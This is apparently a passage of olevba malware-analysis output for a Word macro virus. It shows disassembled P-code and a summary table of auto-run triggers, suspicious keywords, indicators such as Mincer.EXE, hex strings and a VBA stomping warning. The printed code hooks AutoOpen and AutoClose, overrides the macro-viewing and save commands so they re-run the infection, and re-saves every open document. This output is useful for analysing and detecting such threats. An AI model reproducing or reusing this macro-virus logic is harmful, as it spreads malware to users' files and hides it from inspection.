' 	EndSub 
' Line #144:
' 	FuncDefn (Sub AutoOpen())
' Line #145:
' 	ArgsCall AutoExit 0x0000 
' Line #146:
' 	ArgsCall Cl 0x0000 
' Line #147:
' 	ArgsCall IND 0x0000 
' Line #148:
' 	ArgsCall INO 0x0000 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub AutoClose())
' Line #151:
' 	ArgsCall MySpy 0x0000 
' Line #152:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #153:
' 	Ld doc 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	FnInStr 
' 	St v& 
' Line #154:
' 	Ld doc 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld v 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #155:
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub ViewVBCode())
' Line #160:
' 	ArgsCall AutoOpen 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub ViewSecurity())
' Line #163:
' 	ArgsCall AutoOpen 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' 	FuncDefn (Sub ToolsMacro())
' Line #166:
' 	ArgsCall AutoOpen 0x0000 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub FileSaveAs())
' Line #169:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #170:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #171:
' 	ArgsCall AutoOpen 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Sub FileSave())
' Line #174:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #176:
' 	ArgsCall AutoOpen 0x0000 
' Line #177:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Mincer.dll          |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Mincer.EXE          |Executable file name                         |
|Hex String|$pxg                |24707867                                     |
|Hex String|T#0i                |54233069                                     |
|Hex String|9car                |39636172                                     |
|Hex String| baBf               |2062614266                                   |
|Hex String|g4qb                |67347162                                     |
|Hex String|%@2w                |25403277                                     |
|Hex String|%x67                |25783637                                     |
|Hex String| baBH               |2062614248                                   |
|Hex String|#rA8                |23724138                                     |
|Hex String|h&'`                |68262760                                     |
|Hex String| 7ws8               |2037777338                                   |
|Hex String|'Ci2                |27436932                                     |
|Hex String|9@Fg                |39404667                                     |
|Hex String|xwBq                |78774271                                     |
|Hex String|eu`u                |65756075                                     |
|Hex String|U61w                |55363177                                     |
|Hex String|hy'Q                |68792751                                     |
|Hex String|#vw$                |23767724                                     |
|Hex String|%rPt                |25725074                                     |
|Hex String|#a7w                |23613777                                     |
|Hex String|!GC)Y               |2147432959                                   |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

